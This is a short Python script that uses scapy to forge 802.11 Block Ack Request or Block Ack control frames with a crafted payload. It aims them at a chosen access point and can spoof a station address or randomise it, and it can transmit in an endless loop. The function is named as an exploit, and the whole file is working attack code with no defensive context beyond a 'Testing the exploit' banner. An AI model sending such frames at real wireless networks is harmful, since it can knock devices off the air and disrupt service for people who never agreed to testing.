#!/usr/bin/env python3
from scapy.all import Dot11, RadioTap, sendp
import random

#Random STA MAC address
def rand_mac():
      return '%02x:%02x:%02x:%02x:%02x:%02x' % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def BARorBA_exploit(targeted_AP, targeted_STA, WNIC, num, choice, frames, rand, verb):
    if (int(choice) != 8 and int(choice) != 9):
        print("Something is wrong")
        return 1
    
    if int(rand) == 1:
        dot11 = Dot11(type=1, subtype=int(choice), FCfield=0, addr1=targeted_AP, addr2=rand_mac(), addr3=targeted_AP)
    else:
        dot11 = Dot11(type=1, subtype=int(choice), FCfield=0, addr1=targeted_AP, addr2=targeted_STA, addr3=targeted_AP)

    MAC_header = RadioTap()/dot11
    payload = b'\x04\x00\x74\x49\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x7f\x92\x08\x80'
    frame1 = MAC_header / payload

    print('\n- - - - - - - - - - - - - - - -')
    print('Testing the exploit')
    print('- - - - - - - - - - - - - - - - ')

    
    if int(frames) == 0:
        while True:
            sendp(frame1, count=int(num), iface=WNIC, verbose=int(verb))
    else:
        i = 0
        while i <= int(frames):
            i = i+1
            sendp(frame1, count=int(num), iface=WNIC, verbose=int(verb))
    
